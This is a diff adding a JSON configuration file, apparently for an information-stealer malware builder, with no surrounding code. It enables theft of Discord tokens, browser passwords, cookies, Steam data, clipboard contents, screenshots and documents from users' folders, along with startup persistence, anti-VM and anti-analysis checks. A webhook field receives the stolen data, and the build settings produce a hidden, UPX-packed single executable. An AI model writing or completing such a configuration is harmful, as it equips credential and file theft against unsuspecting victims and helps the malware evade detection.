@@ -1,0 +1,48 @@
+{
+    "webhook": "",
+    "zip_password": "infected123",
+    "options": {
+        "screenshot": true,
+        "clipboard": true,
+        "steam": true,
+        "discord_tokens": true,
+        "discord_files": true,
+        "browser_passwords": true,
+        "cookies": true,
+        "file_grabber": true,
+        "file_extensions": [
+            ".txt",
+            ".docx",
+            ".pdf",
+            ".jpg",
+            ".png",
+            ".zip"
+        ],
+        "grab_folders": [
+            "Desktop",
+            "Documents",
+            "Downloads"
+        ],
+        "log_ip": true,
+        "startup": true,
+        "melt": false,
+        "anti_vm": true,
+        "anti_analysis": true
+    },
+    "build": {
+        "onefile": true,
+        "noconsole": true,
+        "icon": "",
+        "output_dir": "dist",
+        "optimize_size": true,
+        "use_upx": true,
+        "exclude_libs": [
+            "matplotlib",
+            "pandas",
+            "numpy",
+            "scipy",
+            "tkinter"
+        ],
+        "target_mb": 0
+    }
+}
